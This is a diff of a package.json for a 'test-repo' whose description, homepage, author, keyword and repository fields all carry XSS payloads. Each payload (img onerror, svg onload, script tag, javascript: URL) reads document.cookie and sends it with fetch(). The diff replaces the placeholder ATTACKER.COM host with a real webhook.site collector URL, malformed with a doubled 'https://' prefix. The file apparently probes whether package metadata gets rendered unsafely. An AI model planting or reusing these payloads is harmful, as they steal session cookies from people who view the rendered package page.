@@ -1,16 +1,16 @@
 {
   "name": "test-repo",
   "version": "1.0.0",
-  "description": "<img src=x onerror=\"fetch('https://ATTACKER.COM/pkg-desc?c='+document.cookie)\">",
-  "homepage": "javascript:fetch('https://ATTACKER.COM/pkg-homepage?c='+document.cookie)",
+  "description": "<img src=x onerror=\"fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/pkg-desc?c='+document.cookie)\">",
+  "homepage": "javascript:fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/pkg-homepage?c='+document.cookie)",
   "repository": {
     "type": "git",
-    "url": "https://ATTACKER.COM/beacon/pkg-repo-url"
+    "url": "https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/beacon/pkg-repo-url"
   },
-  "author": "<script>fetch('https://ATTACKER.COM/pkg-author?c='+document.cookie)</script>",
+  "author": "<script>fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/pkg-author?c='+document.cookie)</script>",
   "license": "MIT",
   "keywords": [
-    "<svg onload=fetch('https://ATTACKER.COM/pkg-keyword?c='+document.cookie)>"
+    "<svg onload=fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/pkg-keyword?c='+document.cookie)>"
   ],
   "dependencies": {
     "lodash": "^4.17.21"
